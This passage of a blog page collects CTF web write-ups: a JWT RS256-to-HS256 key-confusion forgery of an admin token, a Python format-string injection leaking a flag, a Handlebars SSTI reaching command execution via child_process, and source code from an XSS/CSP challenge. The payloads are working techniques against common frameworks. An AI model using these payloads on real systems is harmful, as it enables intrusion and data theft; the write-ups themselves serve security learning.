class="string">zVI9FbkB0nb+Dp04VPRWeeV1IKPZk2DuSOALh9ZacbEQ8Spuua6nxZ5gCSve7TL7</span></span><br><span class="line"><span class="string">r9xg8ml5zZXAw7l8WoHkyy2ocPy0OL+PWFvUar59epfPUQZmRE08yVrlvy+WXFC2</span></span><br><span class="line"><span class="string">dbFxD80tPgbcjJbKRGGv1uOx/3Z2HrXHoOslVmV87rgWfxBaJjrSsSY1fKLYJLnk</span></span><br><span class="line"><span class="string">FKJd6eSLDYzTAczbMiov8F9ovMw4/juWZy2s4QOCdXp7byKOuQUJ+HSiZiNiyjTk</span></span><br><span class="line"><span class="string">XaA5oGEF/FIxAMRbaEd/YSsE7ASMxS4mhyIAGFvqK8YZ+xqEAbNlT4zK+dAAC3mL</span></span><br><span class="line"><span class="string">I/VyHBAlgHRxEiRE860DhfcCAwEAAQ==</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    $issuedAt = <span class="keyword">new</span> DateTimeImmutable();</span><br><span class="line">    $data = [</span><br><span class="line">        <span class="string">&quot;role&quot;</span> =&gt; <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iat&quot;</span> =&gt; $issuedAt-&gt;getTimestamp(),</span><br><span class="line">        <span class="string">&quot;nbf&quot;</span> =&gt; $issuedAt-&gt;getTimestamp()</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $token = JWT::encode($data, $publikKey, <span class="string">&#x27;HS256&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $token;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;RS256&#96; to &#96;HS256&#96;   HS256 是对称的！</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="web-python"><a href="#web-python" class="headerlink" title="web python"></a><code>web python</code></h2><p>Magic Render</p>
+<p>This was a web challenge in the Hero CTF 2021.</p>
+<p><a target="_blank" rel="noopener" href="https://www.heroctf.fr/challenges">https://www.heroctf.fr/challenges</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sambrow/ctf-writeups-2021/blob/master/hero-ctf/magic-render/media/magic-render-chal.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/sambrow/ctf-writeups-2021/raw/master/hero-ctf/magic-render/media/magic-render-chal.png" alt="Magic Render Challenge"></a></p>
+<p>Clicking the link gives us this page: <a target="_blank" rel="noopener" href="https://github.com/sambrow/ctf-writeups-2021/blob/master/hero-ctf/magic-render/media/magic-render-page.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/sambrow/ctf-writeups-2021/raw/master/hero-ctf/magic-render/media/magic-render-page.png" alt="Magic Render Page"></a></p>
+<p>You can enter a title and body and you’ll get back an html page with your title and body inserted.</p>
+<p>I tried various special characters until I saw that <strong>{}</strong> in the body causes this error.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Something went wrong, sorry! It&#39;s only the alpha version !</span><br></pre></td></tr></table></figure>
+
+<p>After some searching, I found this online: <a target="_blank" rel="noopener" href="https://podalirius.net/articles/python-format-string-vulnerabilities/">https://podalirius.net/articles/python-format-string-vulnerabilities/</a></p>
+<p>Finding this page was key to solving this challenge. No way would I have done so without it.</p>
+<p>I tried an example from that page:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure>
+
+<p>and got (newlines added for readability):</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None,</span><br><span class="line">&#39;__loader__&#39;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f5107b17518&gt;,</span><br><span class="line">&#39;__spec__&#39;: None, &#39;__annotations__&#39;: &#123;&#125;, &#39;__builtins__&#39;: , &#39;__file__&#39;: &#39;app.py&#39;,</span><br><span class="line">&#39;__cached__&#39;: None, &#39;Flask&#39;: , &#39;render_template&#39;: , &#39;request&#39;: , &#39;FlaskView&#39;: ,</span><br><span class="line">&#39;route&#39;: , &#39;dis&#39;: , &#39;app&#39;: , &#39;port&#39;: 8050, &#39;secret_function&#39;: , &#39;App&#39;: &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Notice there is a secret_function!</p>
+<p>At first I tried to access it like this:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self.__init__.__globals__.secret_function&#125;</span><br></pre></td></tr></table></figure>
+
+<p>but got back the error. Eventually I learned that I needed to use brackets since <code>__globals__</code> is a dictionary.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self.__init__.__globals__[secret_function]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>But that just gives back an empty page.</p>
+<p>In hindsight, that makes sense since that object must not have a string representation or else it would’ve shown it to us when we dumped out <code>__globals__</code>.</p>
+<p>If I try to call this function:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self.__init__.__globals__[secret_function]()&#125;</span><br></pre></td></tr></table></figure>
+
+<p>I get back an error.</p>
+<p>At this point, I didn’t know to do.</p>
+<p>I copied some example code from the above page and hacked on it a bit so I could play around with this locally.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def secret_function():</span><br><span class="line">    flag &#x3D; &#39;wow&#39;</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">class TEST():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.testValue &#x3D; &#39;test&#39;</span><br><span class="line"></span><br><span class="line">    def renderHTML(self, templateHTML, text):</span><br><span class="line">        return (templateHTML.format(self&#x3D;self, text&#x3D;text))</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) !&#x3D; 2:</span><br><span class="line">        print(&quot;Usage : python3 &quot;+sys.argv[0]+&quot; TEMPLATE CONTENT&quot;)</span><br><span class="line">    else :</span><br><span class="line">        a &#x3D; TEST()</span><br><span class="line">        print(a.renderHTML(sys.argv[1], &#39;foo&#39;))</span><br></pre></td></tr></table></figure>
+
+<p>I could then call this locally like:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 crack.py &#39;&#123;self.__init__.__globals__&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>and got this output:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None, &#39;__package__&#39;: None,</span><br><span class="line">&#39;__loader__&#39;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x10ebb0040&gt;,</span><br><span class="line">&#39;__spec__&#39;: None, &#39;__annotations__&#39;: &#123;&#125;, &#39;__builtins__&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;,</span><br><span class="line">&#39;__file__&#39;: &#39;crack.py&#39;, &#39;__cached__&#39;: None, &#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;,</span><br><span class="line">&#39;secret_function&#39;: &lt;function secret_function at 0x10ede2790&gt;, &#39;TEST&#39;: &lt;class &#39;__main__.TEST&#39;&gt;,</span><br><span class="line">&#39;a&#39;: &lt;__main__.TEST object at 0x10edf6fd0&gt;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>That looks similar enough to the challenge that I thought I was on the right track.</p>
+<p>Wanting to know what was hiding inside the function object, I hacked the renderHTML() method to be:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def renderHTML(self, templateHTML, text):</span><br><span class="line">    return dir(self.__init__.__globals__[&#39;secret_function&#39;])</span><br></pre></td></tr></table></figure>
+
+<p>The dir() method will dump out all of an object’s properties.</p>
+<p>It printed this:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__annotations__&#39;, &#39;__call__&#39;, &#39;__class__&#39;, &#39;__closure__&#39;, &#39;__code__&#39;, &#39;__defaults__&#39;, &#39;__delattr__&#39;,</span><br><span class="line">&#39;__dict__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__get__&#39;, &#39;__getattribute__&#39;,</span><br><span class="line">&#39;__globals__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__kwdefaults__&#39;, &#39;__le__&#39;,</span><br><span class="line">&#39;__lt__&#39;, &#39;__module__&#39;, &#39;__name__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__qualname__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;,</span><br><span class="line">&#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>Not knowing what to look for, I tried several of these until I stumbled upon <code>__code__</code>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def renderHTML(self, templateHTML, text):</span><br><span class="line">    return dir(self.__init__.__globals__[&#39;secret_function&#39;].__code__)</span><br></pre></td></tr></table></figure>
+
+<p>and got:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;__class__&#39;, &#39;__delattr__&#39;, &#39;__dir__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;,</span><br><span class="line">&#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__init_subclass__&#39;, &#39;__le__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;,</span><br><span class="line">&#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;co_argcount&#39;,</span><br><span class="line">&#39;co_cellvars&#39;, &#39;co_code&#39;, &#39;co_consts&#39;, &#39;co_filename&#39;, &#39;co_firstlineno&#39;, &#39;co_flags&#39;, &#39;co_freevars&#39;,</span><br><span class="line">&#39;co_kwonlyargcount&#39;, &#39;co_lnotab&#39;, &#39;co_name&#39;, &#39;co_names&#39;, &#39;co_nlocals&#39;, &#39;co_posonlyargcount&#39;, &#39;co_stacksize&#39;,</span><br><span class="line">&#39;co_varnames&#39;, &#39;replace&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><strong>co_varnames</strong> looked interesting so I tried:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return self.__init__.__globals__[&#39;secret_function&#39;].__code__.co_varnames</span><br></pre></td></tr></table></figure>
+
+<p>and got:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;flag&#39;,)</span><br></pre></td></tr></table></figure>
+
+<p>Then I tried <strong>co_consts</strong>:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return self.__init__.__globals__[&#39;secret_function&#39;].__code__.co_consts</span><br></pre></td></tr></table></figure>
+
+<p>and got:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(None, &#39;wow&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>Armed with this, I was ready to return to the challenge.</p>
+<p>When I submit this for the body:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self.__init__.__globals__[secret_function].__code__.co_varnames&#125;</span><br></pre></td></tr></table></figure>
+
+<p>it returned:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(&#39;flag&#39;,)</span><br></pre></td></tr></table></figure>
+
+<p>Finally, I submitted:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self.__init__.__globals__[secret_function].__code__.co_consts&#125;</span><br></pre></td></tr></table></figure>
+
+<p>and got:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(None, &#39;Hero&#123;l34k_my_byt3c0d3zzzzzz&#125;&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>Again, I got lucky that I found this particular page and that I happened find my way through the maze of properties to find the one containing the flag.</p>
+<p>I definitely learned a lot about all of the properties I never knew were hiding inside Python function objects.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;self&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Black-Market"><a href="#Black-Market" class="headerlink" title="Black Market"></a>Black Market</h1><h2 id="nodejs-ssti"><a href="#nodejs-ssti" class="headerlink" title="nodejs ssti"></a>nodejs ssti</h2><p>Description</p>
+<p>A group of hackers sell illegal services on the deep web. This site has already caused a lot of damage, it must be stopped!</p>
+<p>Find a way to take control of the web server!</p>
+<p>URL : <a target="_blank" rel="noopener" href="http://chall2.heroctf.fr:3050/">http://chall2.heroctf.fr:3050</a></p>
+<p>Format : Hero{}</p>
+<p>Author : Worty</p>
+<p>Solution</p>
+<p>We’ve given a url <code>http://chall2.heroctf.fr:3050</code>.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MrR3boot/CTF/blob/master/HeroCTF-2021/web/BlackMarket/assets/web.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/MrR3boot/CTF/raw/master/HeroCTF-2021/web/BlackMarket/assets/web.png" alt="img"></a></p>
+<p><code>Basket</code> feature shows <code>403</code>.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MrR3boot/CTF/blob/master/HeroCTF-2021/web/BlackMarket/assets/basket.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/MrR3boot/CTF/raw/master/HeroCTF-2021/web/BlackMarket/assets/basket.png" alt="img"></a></p>
+<p>We can buy stuff navigating to <code>Our services</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MrR3boot/CTF/blob/master/HeroCTF-2021/web/BlackMarket/assets/buy.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/MrR3boot/CTF/raw/master/HeroCTF-2021/web/BlackMarket/assets/buy.png" alt="img"></a></p>
+<p>If we buy any item and go back to <code>basket</code> we see it shows price and details.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/MrR3boot/CTF/blob/master/HeroCTF-2021/web/BlackMarket/assets/basket1.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/MrR3boot/CTF/raw/master/HeroCTF-2021/web/BlackMarket/assets/basket1.png" alt="img"></a></p>
+<p>We see that it shows price and number of services purchased. It also generates new bitcoin address on every refresh. The <code>Buy</code> request look like below.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;buy HTTP&#x2F;1.1</span><br><span class="line">Host: chall2.heroctf.fr:3050</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http:&#x2F;&#x2F;chall2.heroctf.fr:3050</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;chall2.heroctf.fr:3050&#x2F;services&#x2F;malware</span><br><span class="line"></span><br><span class="line">id&#x3D;2&amp;type&#x3D;malware&amp;price&#x3D;0.053</span><br></pre></td></tr></table></figure>
+
+<p>Trying SSTI attempt succeeded with <code>&#123;7*7&#125;</code> input.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;buy HTTP&#x2F;1.1</span><br><span class="line">Host: chall2.heroctf.fr:3050</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; rv:78.0) Gecko&#x2F;20100101 Firefox&#x2F;78.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 27</span><br><span class="line">Origin: http:&#x2F;&#x2F;chall2.heroctf.fr:3050</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;chall2.heroctf.fr:3050&#x2F;services&#x2F;ddos</span><br><span class="line">Cookie: basket&#x3D;eyJwdXJjaGFzZXMiOnsiMCI6eyJ0eXBlIjoibWFsd2FyZSIsImlkIjoyLCJwcmljZSI6IjAuMDUzIn19fQ%3D%3D</span><br><span class="line"></span><br><span class="line">id&#x3D;1&amp;type&#x3D;ddos&amp;price&#x3D;&#123;7*7&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/MrR3boot/CTF/blob/master/HeroCTF-2021/web/BlackMarket/assets/ssti.png"><img src= "/img/loading.gif" data-lazy-src="https://github.com/MrR3boot/CTF/raw/master/HeroCTF-2021/web/BlackMarket/assets/ssti.png" alt="img"></a></p>
+<p>Looking at the response headers we see that the server is hosted using NodeJS Express framework.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Set-Cookie: basket&#x3D;eyJwdXJjaGFzZXMiOnsiMCI6eyJ0eXBlIjoibWFsd2FyZSIsImlkIjoyLCJwcmljZSI6IjAuMDUzIn19fQ%3D%3D; Max-Age&#x3D;900; Path&#x3D;&#x2F;; Expires&#x3D;Mon, 26 Apr 2021 05:23:06 GMT; HttpOnly</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 17</span><br><span class="line">ETag: W&#x2F;&quot;11-KLSLPG1b7&#x2F;ut5NWgA8Up&#x2F;1GscNo&quot;</span><br><span class="line">Date: Mon, 26 Apr 2021 05:08:06 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;ok&quot;:&quot;Success.&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>We can try payloads related to either Jade or Handlerbars template engines. I wrote a simple python script to explore the injection.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;chall2.heroctf.fr:3050&#x2F;buy&#39;, data&#x3D;&#123;&#39;id&#39;:&#39;1&#39;,&quot;type&quot;:&#39;malware&#39;,&quot;price&quot;:sys.argv[1]&#125;)</span><br><span class="line">c &#x3D; r.headers[&#39;Set-Cookie&#39;].split(&#39;&#x3D;&#39;)[1].split(&#39;;&#39;)[0]</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;chall2.heroctf.fr:3050&#x2F;basket&#39;, cookies&#x3D;&#123;&#39;basket&#39;:c&#125;)</span><br><span class="line">print(re.findall(r&#39;Total:.*&#39;,r.text)[0])</span><br></pre></td></tr></table></figure>
+
+<p>Running this script with an argument <code>&#123;&#123;this&#125;&#125;</code> gives me <code>[object object]</code> output.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 market.py </span><br><span class="line"></span><br><span class="line">Total: [object Object]&lt;br&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>This confirms that the application is using Handlebars template engine. We can read more from <a target="_blank" rel="noopener" href="http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">this</a> blogpost. <code>env</code> can be accessed using <code>global.process.env</code> and the JavaScript object to string conversion can be done using <code>JSON.stringify</code> method.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 market.py &#39;&#123;&#123;JSON.stringify(process.env)&#125;&#125;&#39;</span><br><span class="line"></span><br><span class="line">Total: &#123;&amp;#34;NODE_VERSION&amp;#34;:&amp;#34;14.16.1&amp;#34;,&amp;#34;HOSTNAME&amp;#34;:&amp;#34;ca7ae5cfca55&amp;#34;,&amp;#34;YARN_VERSION&amp;#34;:&amp;#34;1.22.5&amp;#34;,&amp;#34;HOME&amp;#34;:&amp;#34;&#x2F;root&amp;#34;,&amp;#34;PATH&amp;#34;:&amp;#34;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&amp;#34;,&amp;#34;PWD&amp;#34;:&amp;#34;&#x2F;usr&#x2F;src&#x2F;app&amp;#34;&#125;&lt;br&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Output is gibberish :P but we can read stuff. Flag can be printed using below payload.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 market.py &#39;&#123;&#123;JSON.stringify(process.mainModule.constructor._load(&quot;child_process&quot;).exec(&quot;cat flag.txt&quot;))&#125;&#125;&#39;</span><br><span class="line"></span><br><span class="line">Total: &amp;#34;Hero&#123;g3t_0n_my_l3v4l_4nd_fl3x&#125;\n&amp;#34;&lt;br&#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>两篇nodejs文章不错！</code></p>
+<p><code>https://mp.weixin.qq.com/s/enBJstbquGhQIaxOnrOPtg</code></p>
+<p><code>https://mp.weixin.qq.com/s/Rt_l5y4ivQZQLKp9cM-AaA</code></p>
+<h1 id="The-Galactic-Times"><a href="#The-Galactic-Times" class="headerlink" title="The Galactic Times"></a>The Galactic Times</h1><h2 id="知识点：xss-csp绕过"><a href="#知识点：xss-csp绕过" class="headerlink" title="知识点：xss+csp绕过"></a>知识点：xss+csp绕过</h2><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>The Galactic Times is a monthly Alien newspaper that focuses on news from around the Galaxy. This month’s issue is focused on the Human race and contains some very controversial articles. The newspaper reportedly contains a restricted endpoint with some Alien secrets. Can you find a way to view the forbidden pages?</p>
+<h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><p>Provided docker environment.</p>
+<h2 id="Looking-around"><a href="#Looking-around" class="headerlink" title="Looking around"></a>Looking around</h2><p>This is the website lmao 😂.</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://s-3ntinel.github.io/ctfs/cyberapocalypse_ctf2021/web/the_galactic_times/web.PNG" alt="web"></p>
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><h3 id="routes-index-js"><a href="#routes-index-js" class="headerlink" title="routes/index.js"></a><code>routes/index.js</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const bot &#x3D; require(&#39;..&#x2F;bot&#39;);</span><br><span class="line">const fs &#x3D; require(&#39;fs&#39;);</span><br><span class="line"></span><br><span class="line">let db;</span><br><span class="line"></span><br><span class="line">async function router (fastify, options) &#123;</span><br><span class="line">        fastify.get(&#39;&#x2F;&#39;, async (request, reply) &#x3D;&gt; &#123;</span><br><span class="line">                return reply.type(&#39;text&#x2F;html&#39;).send(fs.readFileSync(&#39;views&#x2F;index.html&#39;,&#123;encoding:&#39;utf8&#39;, flag:&#39;r&#39;&#125;));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        fastify.get(&#39;&#x2F;alien&#39;, async (request, reply) &#x3D;&gt; &#123;</span><br><span class="line">                if (request.ip !&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line">                        return reply.code(401).send(&#123; message: &#39;Only localhost is allowed&#39;&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                return reply.type(&#39;text&#x2F;html&#39;).send(fs.readFileSync(&#39;views&#x2F;alien.html&#39;,&#123;encoding:&#39;utf8&#39;, flag:&#39;r&#39;&#125;));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        fastify.get(&#39;&#x2F;feedback&#39;, async (request, reply) &#x3D;&gt; &#123;</span><br><span class="line">                return reply.type(&#39;text&#x2F;html&#39;).send(fs.readFileSync(&#39;views&#x2F;feedback.html&#39;,&#123;encoding:&#39;utf8&#39;, flag:&#39;r&#39;&#125;));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        fastify.post(&#39;&#x2F;api&#x2F;submit&#39;, async (request, reply) &#x3D;&gt; &#123;</span><br><span class="line">                let &#123; feedback &#125; &#x3D; request.body;</span><br><span class="line"></span><br><span class="line">                if (feedback) &#123;</span><br><span class="line">                        return db.addFeedback(feedback)</span><br><span class="line">                                .then(() &#x3D;&gt; &#123;</span><br><span class="line">                                        bot.purgeData(db);</span><br><span class="line">                                        reply.send(&#123; message: &#39;The Galactic Federation has processed your feedback.&#39; &#125;);</span><br><span class="line">                                &#125;)</span><br><span class="line">                                .catch(() &#x3D;&gt; reply.send(&#123; message: &#39;The Galactic Federation spaceship controller has crashed.&#39;, error: 1&#125;));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return reply.send(&#123; message: &#39;Missing parameters.&#39;, error: 1 &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        fastify.get(&#39;&#x2F;list&#39;, async (request, reply) &#x3D;&gt; &#123;</span><br><span class="line">                if (request.ip !&#x3D; &#39;127.0.0.1&#39;) &#123;</span><br><span class="line">                        return reply.code(401).send(&#123; message: &#39;Only localhost is allowed&#39;&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                return await db.getFeedback()</span><br><span class="line">                        .then(feedback &#x3D;&gt; &#123;</span><br><span class="line">                                if (feedback) &#123;</span><br><span class="line">                                        return reply.view(&#39;views&#x2F;list.pug&#39;, &#123; feedback: feedback &#125;);</span><br><span class="line">                                &#125;</span><br><span class="line">                                return reply.send(&#123; message: &#39;The Galactic Federation archives appear to be empty.&#39; &#125;);</span><br><span class="line">                        &#125;)</span><br><span class="line">                        .catch(() &#x3D;&gt; &#123;</span><br><span class="line">                                return reply.send(&#123; message: &#39;The Galactic Federation spaceship controller has crashed.&#39; &#125;);</span><br><span class="line">                        &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; database &#x3D;&gt; &#123;</span><br><span class="line">        db &#x3D; database;</span><br><span class="line">        return router;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="database-js"><a href="#database-js" class="headerlink" title="database.js"></a><code>database.js</code></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const sqlite &#x3D; require(&#39;sqlite-async&#39;);</span><br><span class="line"></span><br><span class="line">class Database &#123;</span><br><span class="line">    constructor(db_file) &#123;</span><br><span class="line">        this.db_file &#x3D; db_file;</span><br><span class="line">        this.db &#x3D; undefined;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    async connect() &#123;</span><br><span class="line">        this.db &#x3D; await sqlite.open(this.db_file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    async migrate() &#123;</span><br><span class="line">        return this.db.exec(&#96;</span><br><span class="line">            DROP TABLE IF EXISTS feedback;</span><br><span class="line"></span><br><span class="line">            CREATE TABLE IF NOT EXISTS feedback (</span><br><span class="line">                id         INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">                comment  VARCHAR(255) NOT NULL,</span><br><span class="line">                created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            INSERT INTO feedback (comment) VALUES (&#39;Issue #256 is the best issue so far. Keep up the good work.&#39;);</span><br><span class="line">            INSERT INTO feedback (comment) VALUES (&#39;Articles could be better. The memes are not very realistic.&#39;);</span><br><span class="line">            INSERT INTO feedback (comment) VALUES (&#39;This article is very specist. Humans are better than that.&#39;);</span><br><span class="line">        &#96;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    async addFeedback(comment) &#123;</span><br><span class="line">        return new Promise(async (resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                let stmt &#x3D; await this.db.prepare(&#39;INSERT INTO feedback (comment) VALUES (?)&#39;);</span><br><span class="line">                resolve(await stmt.run(comment));</span><br><span class="line">            &#125; catch(e) &#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    async getFeedback() &#123;</span><br><span class="line">        return new Promise(async (resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                let stmt &#x3D; await this.db.prepare(&#39;SELECT * FROM feedback&#39;);</span><br><span class="line">                resolve(await stmt.all());</span><br><span class="line">            &#125; catch(e) &#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; Database;</span><br></pre></td></tr></table></figure>
+
